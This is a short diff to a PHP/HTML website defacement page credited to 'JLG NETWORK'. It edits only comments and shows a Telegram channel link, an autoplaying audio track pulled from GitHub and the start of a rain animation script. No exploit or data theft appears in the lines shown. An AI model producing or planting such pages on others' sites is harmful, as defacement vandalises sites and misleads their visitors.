@@ -1,5 +1,5 @@
 <?php
-// RED RAIN DEFACE - JLG NETWORK
+// DEFACE - JLG NETWORK
 // OWNER : @johenlastgen
 ?>
 <!DOCTYPE html>
@@ -229,7 +229,7 @@ We are JLG NETWORK.
             Channel : <a href="https://t.me/JLGNETWORKREDIRECT" target="_blank">t.me/JLGNETWORKREDIRECT</a>
         </div>
 
-        <!-- Audio: Dengar Laraku dari link GitHub -->
+        <!-- Audio: -->
         <audio controls autoplay loop>
             <source src="https://raw.githubusercontent.com/HOAKKKK/apiserver/refs/heads/main/ssstik.io_1771241509910.mp3" type="audio/mpeg">
             Browser tidak mendukung audio.
@@ -238,7 +238,6 @@ We are JLG NETWORK.
     </div>
 
     <script>
-        // ========== RED RAIN EFFECT ==========
         const canvas = document.getElementById('rainCanvas');
         const ctx = canvas.getContext('2d');
 
